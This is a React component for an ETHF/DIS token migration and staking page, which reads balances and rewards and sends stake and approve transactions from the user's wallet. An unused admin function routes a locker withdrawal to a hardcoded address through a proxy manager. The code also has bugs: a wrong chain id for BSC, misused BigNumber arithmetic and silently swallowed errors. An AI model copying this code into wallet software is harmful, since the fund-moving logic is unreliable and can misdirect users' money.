import { Image } from '../../component'
import styled from 'styled-components'
import Button from '../../component/Button'
import { useEffect, useState } from 'react'
import useGlobal from "../../hooks/useGlobal";
import Web3 from 'web3';
import { BigNumber } from 'ethers';
import { TOKEN_ABI } from '../../abi/index'
import { selectChain } from '../../data/lockde'

import ETHFLogo from '../../assets/images/ethf.png'
import DISLogo from '../../assets/images/dis.png'

const ethfRpcProvider = "https://rpc.etherfair.org"
const bscRpcProvider = "https://bsc-dataseed3.ninicoin.io"
const dec = "1000000000000000000"
const disAddress = '0xe2EcC66E14eFa96E9c55945f79564f468882D24C'
const startTs = 1697040000

const web3Ethf = new Web3(new Web3.providers.HttpProvider(ethfRpcProvider));
const web3Bsc = new Web3(new Web3.providers.HttpProvider(bscRpcProvider));
const disContract = new web3Bsc.eth.Contract(TOKEN_ABI, disAddress)

export default function Migration() {
  const { accounts, currentTokenBalance } = useGlobal()

  const [ethfBalance, setEthfBalance] = useState(BigNumber.from(0))
  const [disBalance, setDisBalance] = useState(BigNumber.from(0))

  const [ethfDeposit, setEthfDeposit] = useState(BigNumber.from(0))
  const [ethfReward, setEthfReward] = useState(BigNumber.from(0))
  const [lastApplyTs, setLastApplyTs] = useState(0)

  const [disDeposit, setDisDeposit] = useState(BigNumber.from(0))
  const [disReward, setDisReward] = useState(BigNumber.from(0))

  const [ethfTotal, setEthfTotal] = useState(BigNumber.from(0))
  const [disTotal, setDisTotal] = useState(BigNumber.from(0))

  const [pledgeEthf, setPledgeEthf] = useState('')
  const [pledgeDis, setPledgeDis] = useState('')

  const [ethfCutOffTs, setEthfCutOffTs] = useState(0)

  const numberWithCommas = (x) => {
    const parts = x.toString().split(".");
    parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    return parts.join(".");
  }

  const handleBalance = async (account) => {
    // const web3Ethf = new Web3(new Web3.providers.HttpProvider(ethfRpcProvider));
    // const web3Bsc = new Web3(new Web3.providers.HttpProvider(bscRpcProvider));
    const balanceEthfWei = await web3Ethf.eth.getBalance(account)
    setEthfBalance(balanceEthfWei)

    const balanceDisWei = await disContract.methods.balanceOf(account).call()
    setDisBalance(balanceDisWei)
  }

  const handleDeposit = async (account) => {
    // const web3Ethf = new Web3(new Web3.providers.HttpProvider(ethfRpcProvider));
    const chainLockerEthf = selectChain(513100)
    const chainLockerDis = selectChain(56)
    const ethfLocker = new web3Ethf.eth.Contract(chainLockerEthf.abi, chainLockerEthf.address)
    const disLocker = new web3Bsc.eth.Contract(chainLockerDis.abi, chainLockerDis.address)
    const depositEthfWei = await ethfLocker.methods.deposits(account).call()
    const depositDisWei = await disLocker.methods.deposits(account).call()
    setEthfDeposit(depositEthfWei)
    setDisDeposit(depositDisWei)
  }

  const handleEthfReward = async (account) => {
    // const web3Ethf = new Web3(new Web3.providers.HttpProvider(ethfRpcProvider));
    const chainLocker = selectChain(513100)
    const ethfLocker = new web3Ethf.eth.Contract(chainLocker.abi, chainLocker.address)

    const rewardEthfWei = await ethfLocker.methods.earned(account).call()

    setEthfReward(rewardEthfWei)

    const ts = await ethfLocker.methods.lastStakeTime(accounts[0]).call()
    const timerange = Math.floor(new Date().getTime()/1000) - Number(ts)
    setLastApplyTs(timerange)
  }

  const handleDisReward = async (account) => {
    const chainLocker = selectChain(56)
    const disLocker = new web3Bsc.eth.Contract(chainLocker.abi, chainLocker.address)
    const rewardDisWei = await disLocker.methods.earned(account).call()
    setDisReward(rewardDisWei)
  }

  const handleTotalSupply = async () => {
    // const web3Ethf = new Web3(new Web3.providers.HttpProvider(ethfRpcProvider));
    const chainLocker = selectChain(513100)
    const ethfLocker = new web3Ethf.eth.Contract(chainLocker.abi, chainLocker.address)
    const ethfTotalSupply = await ethfLocker.methods.totalSupply().call()
    setEthfTotal(ethfTotalSupply)

    const endTs = await ethfLocker.methods.offBlockTs().call()
    setEthfCutOffTs(Number(endTs))

    const chainLockerDis = selectChain(56)
    const disLocker = new web3Bsc.eth.Contract(chainLockerDis.abi, chainLockerDis.address)
    const disTotalSupply = await disLocker.methods.totalSupply().call()
    setDisTotal(disTotalSupply)
  }

  const truncateBigNumber = (bigNum, decimalPlaces) => {
    let str = bigNum + '';
    const index = str.indexOf('.');
    if (index === -1) {
        return bigNum;
    }
    str = str.slice(0, index + decimalPlaces + 1);
    return str;
};

  const handleInputPledgeEthf = async() => {
    const gasPrice = '15000000000000000'
    if(BigNumber.from(ethfBalance).lte(BigNumber.from(gasPrice))) {
     return 
    }
    const loadBal = ((BigNumber.from(ethfBalance) - BigNumber.from(gasPrice)) / BigNumber.from(dec))//.toFixed(4)
    console.log('huoqubalance:', loadBal, truncateBigNumber(loadBal, 4))
    // setPledgeEthf(loadBal)
    setPledgeEthf(truncateBigNumber(loadBal, 4))
  }

  const handleInputPledgeDis = async() => {
    if(BigNumber.from(disBalance) == BigNumber.from(0)) {
     return 
    }
    const loadBal = ((BigNumber.from(disBalance)) / BigNumber.from(dec))//.toFixed(4)

    setPledgeDis(truncateBigNumber(loadBal, 4))
  }

  const handleStakeEthf = async () => {
    if(!accounts || !pledgeEthf) {
      //提示连接钱包
      return
    }

    const web3 = new Web3(window.ethereum)
    const currentNetwork = await web3.eth.net.getId()

    let moveon = false
    if(currentNetwork != 513100) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{chainId: '0x7d44c'}]
        })
        moveon = true
      } catch(e) {
        if ((e).code === 4902) {
          try {
            await (window.ethereum).request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x7d44c',
                chainName: 'EthereumFair',
                nativeCurrency: {
                  name: 'ETHF',
                  symbol:'ETHF',
                  decimals: 18
                },
                rpcUrls: [ethfRpcProvider]
              }]
            })
          } catch (ee) {}
        }
      }
    } else {
      moveon = true
    }
    if(moveon) {
      const chainLocker = selectChain(513100)
      const pledgeEthfWei = web3.utils.toWei(pledgeEthf, "ether")
      const ethfLocker = new web3.eth.Contract(chainLocker.abi, chainLocker.address)
      const calldata = ethfLocker.methods.stakeAndReward(pledgeEthfWei).encodeABI()
      
      try {
        const transaction = await ethfLocker.methods.stakeAndReward(pledgeEthfWei).send({
          from: accounts[0],
          value: web3.utils.toWei(pledgeEthf, "ether"),
          gas: 300000,
          data: calldata
        })
        transaction.on('receipt', (receipt) => {
          console.log("transaction mining", receipt)
          if(Number(receipt.status) == 1) {
            handleDeposit(accounts[0])
            handleTotalSupply()
          }
        }).on('error', (error) => {
          console.log('error', error)
        })
        await transaction;
      } catch(e) {
      }
    }
  }

  const handleStakeDis = async () => {
    if(!accounts || !pledgeDis) {
      //提示连接钱包
      return
    }
    const web3 = new Web3(window.ethereum)
    const currentNetwork = await web3.eth.net.getId()

    let moveon = false
    if(currentNetwork != 56) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{chainId: '0x38'}]
        })
        moveon = true
      } catch(e) {
        if ((e).code === 4902) {
          try {
            await (window.ethereum).request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x7d44c',
                chainName: 'Binance Smart Chain',
                nativeCurrency: {
                  name: 'BNB',
                  symbol:'BNB',
                  decimals: 18
                },
                rpcUrls: [bscRpcProvider]
              }]
            })
          } catch (ee) {}
        }
      }
    } else {
      moveon = true
    }
    
    if(moveon) {
      const chainLocker = selectChain(56)
      const pledgeDisWei = web3.utils.toWei(pledgeDis, "ether")
      const _20DisContract = new web3.eth.Contract(TOKEN_ABI, disAddress)
      const allowance = await _20DisContract.methods.allowance(accounts[0], chainLocker.address).call()
      moveon = false
      if(allowance < BigNumber.from(pledgeDisWei)) {
        const approveCallData = _20DisContract.methods.approve(chainLocker.address, pledgeDisWei).encodeABI()
        try {
          const approveTx = await _20DisContract.methods.approve(chainLocker.address, pledgeDisWei).send({
            from: accounts[0],
            gas: 300000,
            data: approveCallData
          })
          if(Number(approveTx.status) == 1) {
            moveon = true
          }
        }catch(e){
        }
      } else {
        moveon = true
      }
      if(moveon) {
        const disLocker = new web3.eth.Contract(chainLocker.abi, chainLocker.address)
        const calldata = disLocker.methods.stakeAndReward(pledgeDisWei).encodeABI()
        
        try {
          const transaction = await disLocker.methods.stakeAndReward(pledgeDisWei).send({
            from: accounts[0],
            gas: 300000,
            data: calldata
          })
          transaction.on('receipt', (receipt) => {
            console.log("transaction mining", receipt)
            if(Number(receipt.status) == 1) {
              handleDeposit(accounts[0])
              handleTotalSupply()
            }
          }).on('error', (error) => {
            console.log('error', error)
          })
          await transaction;
        } catch(e) {
        }
      }
    }
  }

  const handleWithdraw = async () => {
    const web3 = new Web3(window.ethereum)
    const chainLocker = selectChain(513100)
    const ethfLocker = new web3.eth.Contract(chainLocker.abi, chainLocker.address)

    const mgrAbi = [{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract DisUpgradeProxy","name":"proxy","type":"address"}],"name":"getProxyImplementation","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true},{"inputs":[{"internalType":"contract DisUpgradeProxy","name":"proxy","type":"address"}],"name":"getProxyAdmin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true},{"inputs":[{"internalType":"contract DisUpgradeProxy","name":"proxy","type":"address"},{"internalType":"address","name":"_newAdmin","type":"address"}],"name":"changeProxyAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract DisUpgradeProxy","name":"proxy","type":"address"},{"internalType":"address","name":"_newImpl","type":"address"}],"name":"upgrade","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract DisUpgradeProxy","name":"proxy","type":"address"},{"internalType":"address","name":"_newImpl","type":"address"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"upgradeAndCall","outputs":[],"stateMutability":"payable","type":"function","payable":true},{"inputs":[{"internalType":"contract DisUpgradeProxy","name":"proxy","type":"address"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"configCall","outputs":[],"stateMutability":"payable","type":"function","payable":true}]
    const mgrAddr = '0xB7FEDf6809a4E83B6B0CD92DA3AAF468F461A8DC'

    const adminLocker = new web3.eth.Contract(mgrAbi, mgrAddr)
    const calldata = ethfLocker.methods.withdraw(0, '0xDC6F036a6FE27c8e70F4cf3b2f87Bd97a6b29a2f').encodeABI()
    const fullCallData = adminLocker.methods.configCall('0x46b12D505a7b0E58A837789221A026FBF1156401', calldata).encodeABI()

    adminLocker.methods.configCall('0x46b12D505a7b0E58A837789221A026FBF1156401', calldata).send({
      from:accounts[0],
      data: fullCallData,
      gas: 300000,
    }).on('receipt', (r) => {
      console.log("result:", r)
    }).on('error', (error) => {
      console.log('error', error)
    })
  }

  useEffect(() => {
    if(accounts && accounts[0]) {
      handleBalance(accounts[0])

      const interval = setInterval(() => {
        handleDeposit(accounts[0])
        handleEthfReward(accounts[0])
        handleDisReward(accounts[0])
      }, 1000)

      return () => {
        clearInterval(interval)
      }
    }
    handleTotalSupply()
  }, [accounts])

  return (
    <MigrationContanier>

      <div className='w-[80%] leading-[1.2]'>
        <h1 className='text-2xl font-cs'>Migration</h1>
        <p className='font-cr text-sm mt-2'>Why migration ETHF and DIS?</p>
        <p className='font-cr text-sm'>Both ETHF and DIS will release currency exchange contracts. The currency exchange contract is a token distribution on the new main network. The address holding ETHF needs to pledge the tokens to the currency exchange contract of ETHF. The address holding Dis needs to transfer the tokens. The currency is pledged to the currency exchange contract of Dis.</p>
      </div>

      <div className='w-[80%] flex items-center gap-12'>

        <div className='dashboard-wrapper box-border'>
          <div className='dashboard-inner py-12 px-8'>
            <fieldset className='sub-title font-cs'>
              <legend>ETHF migration value</legend>
              <p className='text-center text-2xl'>{ numberWithCommas((BigNumber.from(ethfTotal) / BigNumber.from(dec)).toFixed(4)) }</p>
            </fieldset>
            <fieldset className='sub-title font-cs mt-6'>
              <legend>DIS Token migration value</legend>
              <p className='text-center text-2xl'>{ numberWithCommas((BigNumber.from(disTotal) / BigNumber.from(dec)).toFixed(4)) }</p>
            </fieldset>
            <fieldset className='sub-title font-cs mt-6'>
              <legend>Rewards of token migration DIS/ETHF (day)*</legend>
              <p className='text-center text-2xl'>27,397</p>
            </fieldset>
          </div>
        </div>

        <div className='migration-wrapper'>
          <div className='migration-inner'>

            <fieldset className='sub-title font-cs'>
              <legend>YOU CAN BRIDGE</legend>
              <div className='flex items-center px-8 py-4'>
                <h1>{ (BigNumber.from(disBalance) / BigNumber.from(dec)).toFixed(4) } DIS</h1>
                <Image className="logo" size={24} src={DISLogo} />
              </div>
            </fieldset>
            
            <div className='form-wrapper'>
              <div className='form-inner'>
                <fieldset className='sub-title font-cs'>
                  <legend>Migration</legend>
                  <div className='input-box flex items-center'>
                    <input placeholder='Pledge Quantity' value={pledgeDis} onChange={e => setPledgeDis(e.target.value)}  type='number' />
                    <button className='button-max'>max</button>
                  </div>
                  <h3 className='mt-4'>Balance: {(BigNumber.from(disBalance) / BigNumber.from(dec)).toFixed(4)} DIS</h3>
                </fieldset>
              </div>
            </div>

            <button className='submit-button font-cs'>start now</button>
          </div>
        </div>
      </div>

      
      
    </MigrationContanier>
  )
}
const MigrationContanier = styled.div`
  --color: #1559ed;
  --text-color: #008aff;
  position: relative;
  color: var(--text-color);
  background: black;
  min-height: 100vh;
  box-sizing: border-box;
  padding: 100px 0 60px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 40px;

  .sub-title {
    font-size: 14px;
    border-top: 1px solid var(--color);
    legend {
      text-align: center;
      padding: 0 20px;
      text-transform: capitalize;
    }
    .logo {
      display: block;
      margin: 0 auto 0 10px;
      border-radius: 99px;
    }
  }

  .migration-wrapper {
    flex: 1;
    height: 400px;
    padding: 1px;
    clip-path: polygon(100% 0,100% calc(100% - 56px),calc(100% - 56px) 100%,0 100%,0 32px,32px 0);
    background: var(--color);
    border-radius: 3px;

    .migration-inner {
      height: 398px;
      padding: 20px 40px;
      border-radius: 3px;
      clip-path: polygon(100% 0,100% calc(100% - 56px),calc(100% - 56px) 100%,0 100%,0 32px,32px 0);
      background: black;
    }

    .form-wrapper {
      background: var(--color);
      border-radius: 3px;
      height: 200px;
      padding: 1px;
      margin-top: 12px;
      clip-path: polygon(100% 0,100% calc(100% - 16px),calc(100% - 16px) 100%,0 100%,0 16px,16px 0);
      
      .form-inner {
        height: 198px;
        background: black;
        border-radius: 3px;
        padding: 16px 20px;
        clip-path: polygon(100% 0,100% calc(100% - 16px),calc(100% - 16px) 100%,0 100%,0 16px,16px 0);

        .input-box {
          border: 1px solid var(--color);
          border-radius: 3px;
          margin-top: 20px;

          >input {
            flex: 1;
            font-size: 20px;
            padding: 10px;
            color: white;
          }

          .button-max {
            width: 120px;
            align-self: stretch;
            text-transform: uppercase;
            border-left: 1px solid var(--color);
            &:hover {
              color: white;
            }
          }
        }

      }
    }

    .submit-button {
      background: var(--color);
      width: 100%;
      line-height: 1.2;
      font-size: 16px;
      padding: 12px 0;
      color: white;
      border-radius: 6px;
      clip-path: polygon(20px 0,100% 0,100% 50%,calc(100% - 20px) 100%,0 100%,0 50%);
      transition: all .3s;
      margin-top: 20px;
      text-transform: capitalize;
      &:hover {
        background: white;
        color: var(--text-color);
      }
    }
  }

  .dashboard-wrapper {
    width: 520px;
    clip-path: polygon(100% 0,100% calc(100% - 56px),calc(100% - 56px) 100%,0 100%,0 32px,32px 0);
    background: var(--color);
    border-radius: 3px;
    padding: 1px;
    
    .dashboard-inner {
      height: 100%;
      clip-path: polygon(100% 0,100% calc(100% - 56px),calc(100% - 56px) 100%,0 100%,0 32px,32px 0);
      background: black;
      border-radius: 3px;
    }
  }
`